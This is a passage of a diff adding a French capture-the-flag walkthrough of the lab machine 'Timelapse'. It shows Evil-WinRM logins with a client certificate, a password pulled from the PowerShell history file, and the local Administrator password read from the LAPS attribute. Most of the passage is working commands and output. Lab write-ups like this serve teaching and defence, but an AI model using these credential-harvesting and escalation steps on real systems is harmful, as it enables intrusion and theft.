+<td><strong>Negotiate</strong></td>
+<td>Kerberos si disponible, sinon NTLM</td>
+<td>✅ Bon</td>
+</tr>
+<tr>
+<td><strong>CredSSP</strong></td>
+<td>Delegation de credentials</td>
+<td>⚠️ Risque de vol</td>
+</tr>
+<tr>
+<td><strong>Certificate</strong></td>
+<td>Certificat X.509 + Clé privée</td>
+<td>✅ Très fort</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Notre cas :</strong> Authentification par <strong>certificat client</strong> (Client Certificate Authentication)</p>
+<h3 id="-connexion-winrm-avec-evil-winrm">🚪 Connexion WinRM avec Evil-WinRM<a hidden class="anchor" aria-hidden="true" href="#-connexion-winrm-avec-evil-winrm">#</a></h3>
+<p><strong>Evil-WinRM</strong> est un outil offensif pour exploitation WinRM :</p>
+<ul>
+<li>Support certificats</li>
+<li>Upload/Download de fichiers</li>
+<li>Load de modules PowerShell</li>
+<li>Bypass AMSI/AppLocker</li>
+<li>Menu interactif</li>
+</ul>
+<p><strong>Installation :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Via gem (Ruby)</span>
+</span></span><span style="display:flex;"><span>sudo gem install evil-winrm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vérification</span>
+</span></span><span style="display:flex;"><span>evil-winrm --version
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Evil-WinRM shell v3.5</span>
+</span></span></code></pre></div><p><strong>Commande de connexion :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -i 10.10.11.152 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -c cert.pem <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -k key.pem <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -S
+</span></span></code></pre></div><p><strong>Flags expliqués :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Signification</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-i</code></td>
+<td>IP/hostname cible</td>
+</tr>
+<tr>
+<td><code>-c</code></td>
+<td>Certificat (public key)</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>Clé privée (private key)</td>
+</tr>
+<tr>
+<td><code>-S</code></td>
+<td><strong>SSL activé</strong> (port 5986 au lieu de 5985)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>✅ Connexion Réussie !</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Evil-WinRM shell v3.5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; whoami
+</span></span><span style="display:flex;"><span>timelapse\legacyy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; hostname
+</span></span><span style="display:flex;"><span>DC01
+</span></span></code></pre></div><h3 id="-user-flag">🏁 User Flag<a hidden class="anchor" aria-hidden="true" href="#-user-flag">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; cd ..\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\legacyy\Desktop&gt; dir
+</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\legacyy\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---       <span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">13</span>/<span style="color:#ae81ff">2025</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">57</span> PM             <span style="color:#ae81ff">34</span> user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\legacyy\Desktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>3a84f0e5************************  <span style="color:#960050;background-color:#1e0010">⭐</span> USER FLAG
+</span></span></code></pre></div><hr>
+<h2 id="5-élévation---svc_deploy">5️⃣ ÉLÉVATION - SVC_DEPLOY<a hidden class="anchor" aria-hidden="true" href="#5-élévation---svc_deploy">#</a></h2>
+<h3 id="-énumération-post-exploitation">🔍 Énumération Post-Exploitation<a hidden class="anchor" aria-hidden="true" href="#-énumération-post-exploitation">#</a></h3>
+<p><strong>Informations utilisateur :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; whoami /all
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER INFORMATION
+</span></span><span style="display:flex;"><span>----------------
+</span></span><span style="display:flex;"><span>User Name         SID
+</span></span><span style="display:flex;"><span>================= =============================================
+</span></span><span style="display:flex;"><span>timelapse\legacyy S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">671920749</span>-<span style="color:#ae81ff">559770252</span>-<span style="color:#ae81ff">3318990721</span>-<span style="color:#ae81ff">1603</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>Group Name                                  Type             SID
+</span></span><span style="display:flex;"><span>=========================================== ================ =============
+</span></span><span style="display:flex;"><span>Everyone                                    Well-known group S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>BUILTIN\Remote Management Users             Alias            S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">32</span>-<span style="color:#ae81ff">580</span>  <span style="color:#960050;background-color:#1e0010">⬅</span>️ WinRM access
+</span></span><span style="display:flex;"><span>BUILTIN\Users                               Alias            S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">32</span>-<span style="color:#ae81ff">545</span>
+</span></span><span style="display:flex;"><span>NT AUTHORITY\NETWORK                        Well-known group S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users            Well-known group S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">11</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS&gt; net user legacyy /domain
+</span></span><span style="display:flex;"><span>The request will be processed at a domain controller <span style="color:#66d9ef">for</span> domain timelapse.htb.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User name                    legacyy
+</span></span><span style="display:flex;"><span>Full Name                    Legacyy
+</span></span><span style="display:flex;"><span>Comment
+</span></span><span style="display:flex;"><span>User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment
+</span></span><span style="display:flex;"><span>Country/region code          <span style="color:#ae81ff">000</span> (System <span style="color:#66d9ef">Default</span>)
+</span></span><span style="display:flex;"><span>Account active               Yes
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Local Group Memberships      *Remote Management Use
+</span></span><span style="display:flex;"><span>Global Group memberships     *Domain Users         *Development
+</span></span></code></pre></div><p><strong>💡 Découvertes :</strong></p>
+<ul>
+<li>Membre de <code>Remote Management Users</code> (accès WinRM confirmé)</li>
+<li>Membre du groupe <code>Development</code> (permissions potentiellement élevées)</li>
+<li>Compte utilisateur standard (pas admin)</li>
+</ul>
+<h3 id="-powershell-history---goldmine-de-credentials">🎯 PowerShell History - Goldmine de Credentials<a hidden class="anchor" aria-hidden="true" href="#-powershell-history---goldmine-de-credentials">#</a></h3>
+<p><strong>🎓 Concept Important :</strong></p>
+<p>PowerShell stocke un historique des commandes dans un fichier texte via le module <strong>PSReadLine</strong>. Ce fichier contient <strong>TOUT</strong> ce qui a été tapé, y compris :</p>
+<ul>
+<li>✅ Mots de passe en clair</li>
+<li>✅ Credentials dans des scripts</li>
+<li>✅ Commandes administratives sensibles</li>
+<li>✅ Tokens/API keys</li>
+<li>✅ Chemins réseau</li>
+</ul>
+<p><strong>Chemin du fichier :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</span></span></code></pre></div><p><strong>Équivalent :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</span></span></code></pre></div><p><strong>Lecture de l&rsquo;historique :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>ipconfig /all
+</span></span><span style="display:flex;"><span>netstat -ano |select-string LIST
+</span></span><span style="display:flex;"><span>$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+</span></span><span style="display:flex;"><span>$p = ConvertTo-SecureString <span style="color:#e6db74">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>$c = New-Object System.Management.Automation.PSCredential (<span style="color:#e6db74">&#39;svc_deploy&#39;</span>, $p)
+</span></span><span style="display:flex;"><span>invoke-command -computername localhost -credential $c -port <span style="color:#ae81ff">5986</span> -usessl -SessionOption $so -scriptblock {whoami}
+</span></span><span style="display:flex;"><span>get-aduser -filter * -properties *
+</span></span><span style="display:flex;"><span>exit
+</span></span></code></pre></div><p><strong>🔑 JACKPOT ! Credentials Trouvés :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Username: svc_deploy
+</span></span><span style="display:flex;"><span>Password: E3R$Q62^12p7PLlC%KWaxuaV
+</span></span></code></pre></div><h3 id="-analyse-technique-du-script-powershell">🎓 Analyse Technique du Script PowerShell<a hidden class="anchor" aria-hidden="true" href="#-analyse-technique-du-script-powershell">#</a></h3>
+<p><strong>Ligne par ligne :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># 1. Créer des options de session (ignorer validation SSL)</span>
+</span></span><span style="display:flex;"><span>$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Flags expliqués :</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   -SkipCACheck          : Ne pas vérifier si le certificat est signé par une CA de confiance</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   -SkipCNCheck          : Ne pas vérifier si le CN du certificat correspond au hostname</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   -SkipRevocationCheck  : Ne pas vérifier si le certificat est révoqué (CRL)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Convertir le mot de passe en SecureString</span>
+</span></span><span style="display:flex;"><span>$p = ConvertTo-SecureString <span style="color:#e6db74">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -AsPlainText : Le mot de passe est fourni en clair (pas chiffré)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -Force       : Ignorer l&#39;avertissement de sécurité</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. Créer un objet PSCredential</span>
+</span></span><span style="display:flex;"><span>$c = New-Object System.Management.Automation.PSCredential (<span style="color:#e6db74">&#39;svc_deploy&#39;</span>, $p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PSCredential = Username + SecureString password (format requis par PowerShell)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. Exécuter une commande à distance via WinRM</span>
+</span></span><span style="display:flex;"><span>invoke-command \
+</span></span><span style="display:flex;"><span>  -computername localhost \           <span style="color:#75715e"># Cible : machine locale (DC01)</span>
+</span></span><span style="display:flex;"><span>  -credential $c \                    <span style="color:#75715e"># Utiliser les credentials de svc_deploy</span>
+</span></span><span style="display:flex;"><span>  -port <span style="color:#ae81ff">5986</span> \                        <span style="color:#75715e"># WinRM HTTPS</span>
+</span></span><span style="display:flex;"><span>  -usessl \                           <span style="color:#75715e"># Forcer SSL/TLS</span>
+</span></span><span style="display:flex;"><span>  -SessionOption $so \                <span style="color:#75715e"># Options créées à l&#39;étape 1</span>
+</span></span><span style="display:flex;"><span>  -scriptblock {whoami}               <span style="color:#75715e"># Commande à exécuter : whoami</span>
+</span></span></code></pre></div><p><strong>💡 Pourquoi ce script existe ?</strong></p>
+<p>Scénario probable :</p>
+<ol>
+<li>Administrateur a besoin de tester WinRM avec <code>svc_deploy</code></li>
+<li>Certificat SSL auto-signé → nécessite de skip les vérifications</li>
+<li>Met le mot de passe <strong>en clair</strong> dans le script (mauvaise pratique !)</li>
+<li>Oublie de nettoyer l&rsquo;historique PowerShell</li>
+</ol>
+<h3 id="-connexion-en-tant-que-svc_deploy">🔄 Connexion en tant que svc_deploy<a hidden class="anchor" aria-hidden="true" href="#-connexion-en-tant-que-svc_deploy">#</a></h3>
+<p><strong>Déconnexion :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; exit
+</span></span></code></pre></div><p><strong>Nouvelle connexion :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -i 10.10.11.152 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u svc_deploy <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -S
+</span></span></code></pre></div><p><strong>✅ Connexion Réussie !</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; whoami
+</span></span><span style="display:flex;"><span>timelapse\svc_deploy
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; whoami /groups
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>Group Name                                  Type             SID
+</span></span><span style="display:flex;"><span>=========================================== ================ =============
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>BUILTIN\Remote Management Users             Alias            S-1-5-32-580
+</span></span><span style="display:flex;"><span>TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-...-2103  ⭐
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><strong>🎉 Découverte Majeure :</strong> <code>svc_deploy</code> est membre du groupe <strong>LAPS_Readers</strong> !</p>
+<hr>
+<h2 id="6-exploitation-laps">6️⃣ EXPLOITATION LAPS<a hidden class="anchor" aria-hidden="true" href="#6-exploitation-laps">#</a></h2>
+<h3 id="-quest-ce-que-laps-">🎓 Qu&rsquo;est-ce que LAPS ?<a hidden class="anchor" aria-hidden="true" href="#-quest-ce-que-laps-">#</a></h3>
+<p><strong>LAPS (Local Administrator Password Solution)</strong> est une solution Microsoft gratuite qui :</p>
+<p><strong>Problème résolu :</strong></p>
+<ul>
+<li>Évite l&rsquo;utilisation du <strong>même mot de passe</strong> pour le compte Administrateur local sur toutes les machines</li>
+<li>Empêche les attaques <strong>Pass-the-Hash</strong> latérales</li>
+</ul>
+<p><strong>Fonctionnement :</strong></p>
+<ol>
+<li>
+<p><strong>Extension du schéma AD :</strong></p>
+<ul>
+<li>Ajoute 2 attributs aux objets Computer :
+<ul>
+<li><code>ms-Mcs-AdmPwd</code> : Mot de passe en clair (!)</li>
+<li><code>ms-Mcs-AdmPwdExpirationTime</code> : Date d&rsquo;expiration</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Agent LAPS sur chaque machine :</strong></p>
+<ul>
+<li>Génère un mot de passe aléatoire (12-14 caractères par défaut)</li>
+<li>Applique le mot de passe au compte Administrateur local</li>
+<li>Écrit le mot de passe dans AD (attribut <code>ms-Mcs-AdmPwd</code>)</li>
+<li>Rotation automatique (ex: tous les 30 jours)</li>
+</ul>
+</li>
+<li>
+<p><strong>ACLs sur l&rsquo;attribut AD :</strong></p>
+<ul>
+<li>Seuls les membres de <code>LAPS_Readers</code> (ou équivalent) peuvent lire <code>ms-Mcs-AdmPwd</code></li>
+<li>Les ordinateurs peuvent écrire leur propre mot de passe (SELF)</li>
+</ul>
+</li>
+</ol>
+<p><strong>Architecture :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>┌──────────────┐
+</span></span><span style="display:flex;"><span>│  Computer    │ 
+</span></span><span style="display:flex;"><span>│  DC01        │───┐
+</span></span><span style="display:flex;"><span>│              │   │ Write password
+</span></span><span style="display:flex;"><span>│  LAPS Agent  │   │ (every 30 days)
+</span></span><span style="display:flex;"><span>└──────────────┘   │
+</span></span><span style="display:flex;"><span>                   ▼
+</span></span><span style="display:flex;"><span>              ┌─────────────────────────────┐
+</span></span><span style="display:flex;"><span>              │  Active Directory           │
+</span></span><span style="display:flex;"><span>              │  ┌───────────────────────┐  │
+</span></span><span style="display:flex;"><span>              │  │ Computer Object: DC01 │  │
+</span></span><span style="display:flex;"><span>              │  │                       │  │
+</span></span><span style="display:flex;"><span>              │  │ ms-Mcs-AdmPwd:        │  │
+</span></span><span style="display:flex;"><span>              │  │   &#34;P@ssw0rd123!xyz&#34;   │◄─┼─── Read by
+</span></span><span style="display:flex;"><span>              │  │                       │  │    LAPS_Readers
+</span></span><span style="display:flex;"><span>              │  │ ms-Mcs-AdmPwdExp:     │  │
+</span></span><span style="display:flex;"><span>              │  │   2025-01-15          │  │
+</span></span><span style="display:flex;"><span>              │  └───────────────────────┘  │
+</span></span><span style="display:flex;"><span>              └─────────────────────────────┘
+</span></span></code></pre></div><p><strong>Avantages Sécurité :</strong></p>
+<ul>
+<li>✅ Mots de passe uniques par machine</li>
+<li>✅ Rotation automatique</li>
+<li>✅ Audit centralisé (qui lit les mots de passe)</li>
+<li>✅ Pas de stockage local du mot de passe</li>
+</ul>
+<p><strong>Vulnérabilité :</strong></p>
+<ul>
+<li>❌ Mot de passe stocké <strong>en clair</strong> dans AD (pas de hash !)</li>
+<li>❌ Si compromission d&rsquo;un compte LAPS_Readers → accès admin local sur toutes les machines</li>
+</ul>
+<h3 id="-énumération-laps">🔍 Énumération LAPS<a hidden class="anchor" aria-hidden="true" href="#-énumération-laps">#</a></h3>
+<p><strong>Vérification des groupes de svc_deploy :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; net user svc_deploy /domain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User name                    svc_deploy
+</span></span><span style="display:flex;"><span>Full Name                    svc_deploy
+</span></span><span style="display:flex;"><span>Comment
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Local Group Memberships      *Remote Management Use
+</span></span><span style="display:flex;"><span>Global Group memberships     *LAPS_Readers         *Domain Users  <span style="color:#960050;background-color:#1e0010">⭐</span>
+</span></span></code></pre></div><p><strong>Énumération des ordinateurs du domaine :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; Get-ADComputer -Filter * | Select-Object Name
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Name
+</span></span><span style="display:flex;"><span>----
+</span></span><span style="display:flex;"><span>DC01  <span style="color:#960050;background-color:#1e0010">⬅</span>️ Le contrôleur de domaine
+</span></span></code></pre></div><p><strong>Alternative :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; $env:LOGONSERVER
+</span></span><span style="display:flex;"><span>\\DC01
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS&gt; $env:USERDNSDOMAIN
+</span></span><span style="display:flex;"><span>timelapse.htb
+</span></span></code></pre></div><h3 id="-récupération-du-laps-password">🔑 Récupération du LAPS Password<a hidden class="anchor" aria-hidden="true" href="#-récupération-du-laps-password">#</a></h3>
+<p><strong>Commande PowerShell :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; Get-ADComputer -Identity <span style="color:#e6db74">&#34;DC01&#34;</span> -Properties ms-Mcs-AdmPwd | Select-Object name, ms-Mcs-AdmPwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name  ms-Mcs-AdmPwd
+</span></span><span style="display:flex;"><span>----  -------------
+</span></span><span style="display:flex;"><span>DC01  I)}73pmp{<span style="color:#ae81ff">9</span>+;E2/kWv0LZ7Tt  <span style="color:#960050;background-color:#1e0010">⭐</span>
+</span></span></code></pre></div><p><strong>Alternative (méthode LDAP directe) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; Get-ADObject -Filter {objectClass <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;computer&#34;</span>} -Properties ms-Mcs-AdmPwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DistinguishedName  <span style="color:#960050;background-color:#1e0010">:</span> CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+</span></span><span style="display:flex;"><span>ms-Mcs-AdmPwd      <span style="color:#960050;background-color:#1e0010">:</span> I)}73pmp{<span style="color:#ae81ff">9</span>+;E2/kWv0LZ7Tt
+</span></span><span style="display:flex;"><span>Name               <span style="color:#960050;background-color:#1e0010">:</span> DC01
+</span></span><span style="display:flex;"><span>ObjectClass        <span style="color:#960050;background-color:#1e0010">:</span> computer
+</span></span></code></pre></div><p><strong>🎉 Credentials Administrator Local Obtenus :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Username: Administrator
+</span></span><span style="display:flex;"><span>Password: I)}73pmp{9+;E2/kWv0LZ7Tt
+</span></span></code></pre></div><p><strong>💡 Note :</strong> Ce mot de passe est pour le compte <strong>Administrateur LOCAL</strong> de DC01, pas nécessairement le compte Domain Admin.</p>
+<hr>
+<h2 id="7-accès-root">7️⃣ ACCÈS ROOT<a hidden class="anchor" aria-hidden="true" href="#7-accès-root">#</a></h2>
+<h3 id="-connexion-en-tant-quadministrator">🚪 Connexion en tant qu&rsquo;Administrator<a hidden class="anchor" aria-hidden="true" href="#-connexion-en-tant-quadministrator">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -i 10.10.11.152 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u Administrator <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;I)}73pmp{9+;E2/kWv0LZ7Tt&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -S
+</span></span></code></pre></div><p><strong>✅ Connexion Réussie !</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+</span></span><span style="display:flex;"><span>timelapse\administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami /groups | Select-String &#34;Admin&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BUILTIN\Administrators                      Alias    S-1-5-32-544  ⬅️ Admin local
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h3 id="-recherche-du-root-flag">🔍 Recherche du Root Flag<a hidden class="anchor" aria-hidden="true" href="#-recherche-du-root-flag">#</a></h3>
+<p><strong>Tentative 1 : Dossier classique</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; cd C:\Users\Administrator\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vide !</span>
+</span></span></code></pre></div><p><strong>Tentative 2 : Recherche globale</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; Get-ChildItem -Path C:\ -Recurse -Filter *.txt -ErrorAction SilentlyContinue | Where-Object {$_.Name <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;root.txt&#34;</span>}
+</span></span><span style="display:flex;"><span>
